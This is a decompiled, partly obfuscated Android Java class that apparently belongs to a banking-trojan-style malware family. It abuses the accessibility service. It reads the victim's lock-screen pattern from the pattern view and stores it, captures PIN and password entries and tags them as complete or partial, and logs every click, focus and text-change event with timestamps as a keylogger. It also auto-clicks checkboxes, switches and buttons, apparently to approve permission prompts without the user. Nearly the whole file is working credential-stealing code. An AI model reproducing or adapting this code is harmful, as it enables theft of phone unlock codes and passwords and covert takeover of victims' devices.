package fddo;

import android.content.Context;
import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;

import com.sonnokta.p023w;
import com.sonnokta.utils.LogUtil;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class fddo {
    private static String TAG = "bwolf-fddo";

    /* renamed from: new  reason: not valid java name */
    private static final String f54new = Cbreak.fddo("00fcf4492fcbdafb6323ba2f");

    /* renamed from: try  reason: not valid java name */
    public static String f55try = "";

    /* renamed from: fddo  reason: collision with root package name */
    public p023w f118fddo;

    /* renamed from: for  reason: not valid java name */
    private ArrayList<String> f56for = new ArrayList<>();
    private String ifdf = "";

    public fddo() {
    }

    public fddo(p023w p023w) {
        this.f118fddo = p023w;
    }

    /* renamed from: break  reason: not valid java name */
    public static List<Object> m86break(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        LogUtil.showErrorLog(TAG, "--- m86break ---");

        if (accessibilityNodeInfo == null || accessibilityNodeInfo.getClassName() == null) {
            return new ArrayList();
        }
        ArrayList arrayList = new ArrayList();
        if (accessibilityNodeInfo.getClassName().toString().contains(str)) {
            arrayList.add(accessibilityNodeInfo);
        }

        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            List<Object> list = m86break(accessibilityNodeInfo.getChild(i), str);
            if (list.size() > 0) {
                Iterator<Object> it = list.iterator();
                while (it.hasNext()) {
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                    if (accessibilityNodeInfo2.getClassName().toString().contains(str)) {
                        arrayList.add(accessibilityNodeInfo2);
                    }
                }
            }
        }

        return arrayList;
    }

    /* renamed from: case  reason: not valid java name */
    public static String m87case(Context context, AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m87case ---");
        AccessibilityNodeInfo accessibilityNodeInfo2;
        int childCount;
        StringBuilder sb;
        String str;
        if (accessibilityNodeInfo == null || (accessibilityNodeInfo2 = m90else(accessibilityNodeInfo, "lockPatternView")) == null || (childCount = accessibilityNodeInfo2.getChildCount()) != 9) {
            return "";
        }
        String str2 = "";
        String str3 = str2;
        int i = 0;
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo2.getChild(i2);
            if (child.getClassName().toString().equals("android.view.View") && child.isFocusable() && child.isEnabled() && !child.isClickable()) {
                String[] split = child.getText().toString().split(" ");
                if (split.length == 3) {
                    str2 = str2 + Integer.parseInt(split[1]) + ";";
                }
                Rect rect = new Rect();
                child.getBoundsInScreen(rect);
                int i3 = rect.left;
                int i4 = i3 + ((rect.right - i3) / 2);
                int i5 = rect.top;
                String str4 = i4 + ":" + (i5 + ((rect.bottom - i5) / 2)) + ";";
                if (!str3.contains(str4)) {
                    str3 = str3 + str4;
                }
                i++;
            }
        }
        if (!str2.isEmpty()) {
            StringBuilder sb2 = new StringBuilder(str2.substring(0, str2.length() - 1));
            sb2.reverse();
            str3 = sb2.toString();
        }
        if (i == 0) {
            Cthrow.m159this(context, "saved_pattern", "");
            return "";
        }
        Cthrow.m159this(context, "saved_pattern", str3);
        if (i >= 4) {
            sb = new StringBuilder();
            str = "GOOD_PATTERN: ";
        } else {
            sb = new StringBuilder();
            str = "TMP_PATTERN: ";
        }
        sb.append(str);
        sb.append(str3);
        return sb.toString();
    }

    /* renamed from: catch  reason: not valid java name */
    public static String m88catch(Context context, AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m88catch ---");
        StringBuilder sb;
        String str;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        String str2 = m87case(context, accessibilityNodeInfo);
        if (!str2.isEmpty()) {
            return str2;
        }
        AccessibilityNodeInfo accessibilityNodeInfo3 = m90else(accessibilityNodeInfo, "pinEntry|passwordEntry|fixedPinEntry");
        if (accessibilityNodeInfo3 == null && (accessibilityNodeInfo2 = m98this(accessibilityNodeInfo)) != null) {
            accessibilityNodeInfo3 = accessibilityNodeInfo2;
        }
        if (accessibilityNodeInfo3 == null || accessibilityNodeInfo3.getText() == null) {
            return "";
        }
        String charSequence = accessibilityNodeInfo3.getText().toString();
        if (charSequence.replace("•", "").isEmpty()) {
            return "";
        }
        Matcher matcher = Pattern.compile("^([0-9•]{1,16})$").matcher(charSequence);
        if (m90else(accessibilityNodeInfo, "pinEntry") == null || !matcher.find()) {
            sb = new StringBuilder();
            str = "SCREEN_PASSWORD:";
        } else if (charSequence.replace("•", "").isEmpty() || charSequence.length() < 4) {
            sb = new StringBuilder();
            str = "PIN_PART:";
        } else {
            sb = new StringBuilder();
            str = "PIN_GOOD:";
        }
        sb.append(str);
        sb.append(charSequence);
        return sb.toString();
    }

    /* renamed from: class  reason: not valid java name */
    public static String m89class(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m89class ---");
        String str = "";
        if (accessibilityNodeInfo == null) {
            return str;
        }
        if (accessibilityNodeInfo.getText() != null) {
            str = str + accessibilityNodeInfo.getText();
        }
        if (accessibilityNodeInfo.getContentDescription() != null) {
            str = str + accessibilityNodeInfo.getContentDescription();
        }
        if (Build.VERSION.SDK_INT >= 28 && accessibilityNodeInfo.getTooltipText() != null) {
            str = str + accessibilityNodeInfo.getTooltipText();
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            str = str + m89class(accessibilityNodeInfo.getChild(i));
        }
        return str;
    }

    /* renamed from: else  reason: not valid java name */
    public static AccessibilityNodeInfo m90else(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        LogUtil.showErrorLog(TAG, "--- m90else ---");
        return m92goto(accessibilityNodeInfo, str, false);
    }

    /* renamed from: for  reason: not valid java name */
    public static boolean m91for(AccessibilityNodeInfo accessibilityNodeInfo, boolean z) {
        LogUtil.showErrorLog(TAG, "--- m91for ---");
        if (accessibilityNodeInfo == null) {
            return false;
        }
        for (int i = 0; i < 6; i++) {
            if (accessibilityNodeInfo != null) {
                if (z && accessibilityNodeInfo.isCheckable() && !accessibilityNodeInfo.isChecked()) {
                    return true;
                }
                if (!z && accessibilityNodeInfo.isCheckable() && accessibilityNodeInfo.isChecked()) {
                    return true;
                }
                if (accessibilityNodeInfo.isClickable() || accessibilityNodeInfo.isCheckable()) {
                    if (z && accessibilityNodeInfo.getChildCount() > 0 && m93import(accessibilityNodeInfo)) {
                        return true;
                    }
                    String str = Cconst.m74this(accessibilityNodeInfo);
                    if ((p023w.f15super.isEmpty() || (!str.isEmpty() && !p023w.f15super.equals(str))) && accessibilityNodeInfo.performAction(16)) {
                        p023w.f15super = str;
                        accessibilityNodeInfo.getText();
                        return true;
                    }
                }
                if (m95new(accessibilityNodeInfo)) {
                    return true;
                }
                accessibilityNodeInfo = accessibilityNodeInfo.getParent();
            }
        }
        return false;
    }

    /* renamed from: goto  reason: not valid java name */
    public static AccessibilityNodeInfo m92goto(AccessibilityNodeInfo accessibilityNodeInfo, String str, boolean z) {
        LogUtil.showErrorLog(TAG, "--- m92goto ---");
        if (accessibilityNodeInfo == null) {
            return null;
        }
        int i = 0;
        if (str.contains("|")) {
            String[] split = str.split("\\|");
            int length = split.length;
            while (i < length) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = m92goto(accessibilityNodeInfo, split[i], z);
                if (accessibilityNodeInfo2 != null) {
                    return accessibilityNodeInfo2;
                }
                i++;
            }
            return null;
        } else if (!z) {
            StringBuilder sb = new StringBuilder();
            p023w p023wV = p023w.f19while;
            sb.append(p023wV.f10class);
            sb.append(":id");
            String sb2 = sb.toString();
            if (!str.contains("/")) {
                sb2 = sb2 + "/";
            }
            List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId = p023wV.f19while.m20this().findAccessibilityNodeInfosByViewId(sb2 + str);
            if (findAccessibilityNodeInfosByViewId.size() > 0) {
                return findAccessibilityNodeInfosByViewId.get(0);
            }
            return null;
        } else {
            String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
            if (z) {
                if (viewIdResourceName != null && viewIdResourceName.endsWith(str)) {
                    return accessibilityNodeInfo;
                }
            } else if (viewIdResourceName != null && viewIdResourceName.contains(str)) {
                return accessibilityNodeInfo;
            }
            while (i < accessibilityNodeInfo.getChildCount()) {
                AccessibilityNodeInfo accessibilityNodeInfo3 = m92goto(accessibilityNodeInfo.getChild(i), str, z);
                if (accessibilityNodeInfo3 != null) {
                    return accessibilityNodeInfo3;
                }
                i++;
            }
            return null;
        }
    }

    public static boolean ifdf(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- ifdf ---");
        return m91for(accessibilityNodeInfo, false);
    }

    /* renamed from: import  reason: not valid java name */
    public static boolean m93import(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m93import ---");
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (accessibilityNodeInfo.isCheckable() && !accessibilityNodeInfo.isChecked()) {
            return true;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            if (m93import(accessibilityNodeInfo.getChild(i))) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: native  reason: not valid java name */
    public static java.lang.String m94native(android.content.Context r8, android.view.accessibility.AccessibilityEvent r9, java.lang.String r10) {
        LogUtil.showErrorLog(TAG, "--- m94native Check ---");

        String strV0 = "";
        StringBuilder stringBuilderV1 = new StringBuilder();
        SimpleDateFormat simpleDateFormatV2;
        Locale localeV3 = Locale.US;
        String strV4 = "z MM/dd/yy HH:mm:ss";
        simpleDateFormatV2 = new SimpleDateFormat(strV4, localeV3);
        Calendar calendarV3 = Calendar.getInstance();
        Date dateV3 = calendarV3.getTime();
        String strV2 = simpleDateFormatV2.format(dateV3);
        stringBuilderV1.append(strV2);
        stringBuilderV1.append(" \'");

        String[] strArrP2 = r10.split(",");
        String strP2 = strArrP2[0];
        String strP0 = Cgoto.m132strictfp(r8, strP2);
        stringBuilderV1.append(strP0);
        stringBuilderV1.append("\' ");

        try {
            AccessibilityNodeInfo accessibilityNodeInfoP0 = r9.getSource();
            int intP2 = 1;
            if (accessibilityNodeInfoP0 != null) {
                if (accessibilityNodeInfoP0.getViewIdResourceName() != null) {
                    strP0 = accessibilityNodeInfoP0.getViewIdResourceName();
                    if (strP0.contains("/")) {
                        String[] strArrP0 = strP0.split("/");
                        int intV4 = strArrP0.length;
                        intV4 = intV4 - intP2;
                        strP0 = strArrP0[intV4];

                    }
                }
            } else
                strP0 = strV0;

            List listV4 = r9.getText();
            strV4 = listV4.toString();
            if (strV4.equals("[]"))
                strV4 = strV0;

            int intV5 = r9.getEventType();
            if (intV5 != intP2) {
                if (intV5 != 8) {
                    if (intV5 != 0x10) {
                        if (!strV4.isEmpty()) {
                            stringBuilderV1.append("other ");
                            stringBuilderV1.append(strP0);
                            StringBuilder stringBuilderP0 = new StringBuilder();
                            stringBuilderP0.append(": ");
                            stringBuilderP0.append(strV4);
                            stringBuilderV1.append(stringBuilderP0.toString());
                            if (intP2 != 0)
                                return stringBuilderV1.toString();
                            return strV0;
                        }
                    } else {
                        String strP1 = "changed ";
                        stringBuilderV1.append(strP1);
                        stringBuilderV1.append(strP0);

                        if (!strV4.isEmpty()) {
                            StringBuilder stringBuilderP0 = new StringBuilder();
                            stringBuilderP0.append(": ");
                            stringBuilderP0.append(strV4);
                            stringBuilderV1.append(stringBuilderP0.toString());
                            if (intP2 != 0)
                                return stringBuilderV1.toString();
                            return strV0;
                        }
                    }
                } else {
                    stringBuilderV1.append("focused on ");
                    stringBuilderV1.append(strP0);
                    if (r9.getSource() != null) {
                        accessibilityNodeInfoP0 =  r9.getSource();
                        CharSequence charSequenceP0 =  accessibilityNodeInfoP0.getContentDescription();
                        if (charSequenceP0 != null) {
                            StringBuilder stringBuilderP0 = new StringBuilder();
                            stringBuilderP0.append(strV2);
                            AccessibilityNodeInfo accessibilityNodeInfoP1 = r9.getSource();
                            CharSequence charSequenceP1 =  accessibilityNodeInfoP1.getContentDescription();
                            stringBuilderP0.append(charSequenceP1.toString());
                            stringBuilderP0.append("\'");
                            strP0 = stringBuilderP0.toString();
                            stringBuilderV1.append(strP0);
                        }

                        if (!strV4.isEmpty()){
                            StringBuilder stringBuilderP0 = new StringBuilder();
                            stringBuilderP0.append(" VALUE: ");
                            stringBuilderP0.append(strV4);
                            stringBuilderV1.append(stringBuilderP0.toString());
                            if (intP2 != 0)
                                return stringBuilderV1.toString();
                            return strV0;
                        }
                    }
                }
            } else {
                stringBuilderV1.append("clicked on ");
                stringBuilderV1.append(strP0);
                if (!strV4.isEmpty()) {
                    StringBuilder stringBuilderP0 = new StringBuilder();
                    stringBuilderP0.append(": ");
                    stringBuilderP0.append(strV4);
                    strP0 = stringBuilderP0.toString();
                    stringBuilderV1.append(strP0);
                    if (intP2 != 0)
                        return stringBuilderV1.toString();
                    return strV0;
                } else {
                    if (intP2 != 0)
                        return stringBuilderV1.toString();
                    return strV0;
                }
            }
        } catch (IllegalStateException e0) {

        }

        return strV0;
    }

    /* renamed from: new  reason: not valid java name */
    public static boolean m95new(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m95new ---");
        if (accessibilityNodeInfo == null) {
            return false;
        }
        if (accessibilityNodeInfo.isCheckable() && !accessibilityNodeInfo.isChecked() && accessibilityNodeInfo.performAction(16)) {
            return true;
        }
        for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
            if (m95new(accessibilityNodeInfo.getChild(i))) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: return  reason: not valid java name */
    public static AccessibilityNodeInfo m96return(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2, String str3) {
        LogUtil.showErrorLog(TAG, "--- m96return ---");
        if (accessibilityNodeInfo == null) {
            return null;
        }
        String lowerCase = str2.toLowerCase();
        int i = 0;
        if (lowerCase.contains("|")) {
            String[] split = lowerCase.split("\\|");
            int length = split.length;
            while (i < length) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = m96return(accessibilityNodeInfo, str, split[i], str3);
                if (accessibilityNodeInfo2 != null) {
                    return accessibilityNodeInfo2;
                }
                i++;
            }
            return null;
        }
        if (accessibilityNodeInfo.getClassName().equals(str)) {
            String str4 = "";
            String replace = accessibilityNodeInfo.getText() != null ? accessibilityNodeInfo.getText().toString().toLowerCase().replace(" ", " ") : str4;
            if (accessibilityNodeInfo.getContentDescription() != null) {
                str4 = accessibilityNodeInfo.getContentDescription().toString().toLowerCase().replace(" ", " ");
            }
            if (str3.equals("equals")) {
                if (replace.equals(lowerCase) || str4.equals(lowerCase)) {
                    return accessibilityNodeInfo;
                }
            } else if (str3.equals("startsWith")) {
                if (replace.startsWith(lowerCase) || str4.startsWith(lowerCase)) {
                    return accessibilityNodeInfo;
                }
            } else if (replace.contains(lowerCase) || str4.contains(lowerCase)) {
                return accessibilityNodeInfo;
            }
        }
        while (i < accessibilityNodeInfo.getChildCount()) {
            AccessibilityNodeInfo accessibilityNodeInfo3 = m96return(accessibilityNodeInfo.getChild(i), str, lowerCase, str3);
            if (accessibilityNodeInfo3 != null) {
                return accessibilityNodeInfo3;
            }
            i++;
        }
        return null;
    }

    /* renamed from: static  reason: not valid java name */
    public static AccessibilityNodeInfo m97static(AccessibilityNodeInfo accessibilityNodeInfo, String str, String str2, boolean z) {
        LogUtil.showErrorLog(TAG, "--- m97static ---");
        String str3;
        if (z) {
            new fddo();
            str3 = "equals";
        } else {
            new fddo();
            str3 = "contains";
        }
        return m96return(accessibilityNodeInfo, str, str2, str3);
    }

    /* renamed from: this  reason: not valid java name */
    public static AccessibilityNodeInfo m98this(AccessibilityNodeInfo accessibilityNodeInfo) {
        LogUtil.showErrorLog(TAG, "--- m98this ---");
        if (accessibilityNodeInfo == null) {
            return null;
        }
        if (accessibilityNodeInfo.isPassword()) {
            return accessibilityNodeInfo;
        }
        if (accessibilityNodeInfo.getChildCount() > 0) {
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); i++) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = m98this(accessibilityNodeInfo.getChild(i));
                if (accessibilityNodeInfo2 != null) {
                    return accessibilityNodeInfo2;
                }
            }
        }
        return null;
    }

    /* renamed from: const  reason: not valid java name */
    public boolean m99const() {
        LogUtil.showErrorLog(TAG, "--- m99const ---");
        List<Object> list = m104try("widget.ImageButton");
        List<Object> list2 = m104try("widget.Button");
        if (list.size() == 1 && list2.size() == 3) {
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) list2.get(list2.size() - 1);
            if (accessibilityNodeInfo.isClickable() && ifdf(accessibilityNodeInfo)) {
                return true;
            }
        }
        List<Object> list3 = m104try("widget.TextView");
        if (list3.size() == 0) {
            return false;
        }
        Iterator<Object> it = list3.iterator();
        while (it.hasNext()) {
            AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
            if (accessibilityNodeInfo2.isClickable() && ifdf(accessibilityNodeInfo2)) {
                return true;
            }
        }
        return false;
    }

    public void fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        this.f118fddo.performGlobalAction(1);
    }

    /* renamed from: final  reason: not valid java name */
    public boolean m100final() {
        LogUtil.showErrorLog(TAG, "--- m100final ---");
        List<Object> list = m104try("widget.Button");
        return list.size() == 2 && ifdf((AccessibilityNodeInfo) list.get(1));
    }

    /* renamed from: public  reason: not valid java name */
    public void m101public() {
        this.f118fddo.performGlobalAction(2);
    }

    /* renamed from: super  reason: not valid java name */
    public boolean m102super() {
        LogUtil.showErrorLog(TAG, "--- m102super ---");
        List<Object> list = m104try("widget.Switch");
        return list.size() != 0 && m91for((AccessibilityNodeInfo) list.get(0), true);
    }

    /* renamed from: throw  reason: not valid java name */
    public boolean m103throw(Context context) {
        LogUtil.showErrorLog(TAG, "--- m103throw ---");
        String lowerCase = Cgoto.m137throw(context, 15).toLowerCase();
        Iterator<Object> it = m104try("widget.TextView").iterator();
        while (it.hasNext()) {
            CharSequence text = ((AccessibilityNodeInfo) it.next()).getText();
            if (text != null && text.toString().toLowerCase().startsWith(lowerCase)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: try  reason: not valid java name */
    public List<Object> m104try(String str) {
//        LogUtil.showErrorLog(TAG, "--- m104try ---");
        return m86break(this.f118fddo.m20this(), str);
    }

    /* renamed from: while  reason: not valid java name */
    public boolean m105while(Context context) {
        LogUtil.showErrorLog(TAG, "--- m105while ---");
        String lowerCase = Cgoto.m115extends(context, 10).toLowerCase();
        if (lowerCase.isEmpty()) {
            return false;
        }
        Iterator<Object> it = m104try("widget.TextView").iterator();
        while (it.hasNext()) {
            CharSequence text = ((AccessibilityNodeInfo) it.next()).getText();
            if (text != null && text.toString().toLowerCase().startsWith(lowerCase)) {
                return true;
            }
        }
        return false;
    }
}
